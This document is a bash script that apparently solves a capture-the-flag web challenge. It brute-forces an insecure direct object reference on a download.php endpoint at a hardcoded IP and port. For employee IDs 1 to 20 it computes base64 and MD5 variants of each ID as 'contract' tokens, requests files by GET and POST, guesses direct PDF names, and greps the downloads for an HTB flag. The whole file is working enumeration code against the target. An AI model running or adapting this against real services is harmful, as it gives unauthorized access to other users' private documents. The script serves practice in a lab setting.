#!/bin/bash

# Base URL (replace with actual challenge URL, e.g., http://<SERVER_IP>:<PORT>)
BASE_URL="83.136.252.13:54596"
OUTPUT_DIR="contracts"

# Create directory to store files
mkdir -p "$OUTPUT_DIR"

# Function to compute Base64 and MD5
compute_contract_values() {
  local uid=$1
  # Base64 of uid (e.g., '1' -> 'MQ==')
  BASE64=$(echo -n "$uid" | base64 -w 0)
  # URL-encoded Base64 (e.g., 'MQ==' -> 'MQ%3D%3D')
  URL_ENCODED_BASE64=$(echo -n "$BASE64" | sed 's/+/%2B/g;s/=/%3D/g')
  # MD5 of Base64 (e.g., 'MQ==' -> md5('MQ=='))
  MD5_BASE64=$(echo -n "$BASE64" | md5sum | cut -d' ' -f1)
  # MD5 of uid (e.g., '1' -> md5('1'))
  MD5_UID=$(echo -n "$uid" | md5sum | cut -d' ' -f1)
  echo "$BASE64" "$URL_ENCODED_BASE64" "$MD5_BASE64" "$MD5_UID"
}

# Loop through employee IDs 1 to 20
for i in {1..20}; do
  # Compute contract values
  read BASE64 URL_ENCODED_BASE64 MD5_BASE64 MD5_UID <<< $(compute_contract_values "$i")

  # Array of contract parameters to try
  CONTRACTS=(
    "$URL_ENCODED_BASE64"  # Base64-encoded UID (HTML)
    "$MD5_BASE64"         # MD5 of Base64 (reference script)
    "$MD5_UID"            # MD5 of UID
  )
  METHODS=("GET" "POST")  # Try both GET and POST

  for method in "${METHODS[@]}"; do
    for contract in "${CONTRACTS[@]}"; do
      OUTPUT_FILE="$OUTPUT_DIR/contract_${i}_${method}_${contract:0:8}.pdf"
      echo "Trying $method with contract=$contract for UID $i..."

      if [ "$method" = "GET" ]; then
        curl -s -o "$OUTPUT_FILE" "$BASE_URL/download.php?contract=$contract"
      else
        curl -s -o "$OUTPUT_FILE" -X POST -d "contract=$contract" "$BASE_URL/download.php"
      fi

      # Check if file is downloaded and not empty
      if [ -s "$OUTPUT_FILE" ]; then
        # Check file type
        FILE_TYPE=$(file "$OUTPUT_FILE")
        echo "File $OUTPUT_FILE: $FILE_TYPE"

        # If it's a text file, try cat
        if echo "$FILE_TYPE" | grep -q "text"; then
          echo "Attempting to read with cat:"
          cat "$OUTPUT_FILE"
          # Check for flag
          if cat "$OUTPUT_FILE" | grep -q "flag\|HTB"; then
            echo "Flag found in contract $i ($method, contract=$contract)!"
            exit 0
          fi
        fi

        # Try extracting strings (for PDFs or mislabeled files)
        STRINGS=$(strings "$OUTPUT_FILE")
        if echo "$STRINGS" | grep -q "flag\|HTB"; then
          echo "Possible flag found in contract $i ($method, contract=$contract):"
          echo "$STRINGS" | grep "flag\|HTB"
          exit 0
        fi
      else
        echo "Failed to download contract $i ($method, contract=$contract) or file is empty."
        rm -f "$OUTPUT_FILE"
      fi
    done
  done

  # Try direct file names (e.g., contract1.pdf, 1.pdf)
  for name in "contract$i.pdf" "$i.pdf"; do
    OUTPUT_FILE="$OUTPUT_DIR/direct_$name"
    echo "Trying direct file $name..."
    curl -s -o "$OUTPUT_FILE" "$BASE_URL/$name"

    if [ -s "$OUTPUT_FILE" ]; then
      FILE_TYPE=$(file "$OUTPUT_FILE")
      echo "File $OUTPUT_FILE: $FILE_TYPE"

      if echo "$FILE_TYPE" | grep -q "text"; then
        echo "Attempting to read with cat:"
        cat "$OUTPUT_FILE"
        if cat "$OUTPUT_FILE" | grep -q "flag\|HTB"; then
          echo "Flag found in direct file $name!"
          exit 0
        fi
      fi

      STRINGS=$(strings "$OUTPUT_FILE")
      if echo "$STRINGS" | grep -q "flag\|HTB"; then
        echo "Possible flag found in direct file $name:"
        echo "$STRINGS" | grep "flag\|HTB"
        exit 0
      fi
    else
      echo "Failed to download direct file $name or file is empty."
      rm -f "$OUTPUT_FILE"
    fi
  done
done

echo "No flag found in the contracts."
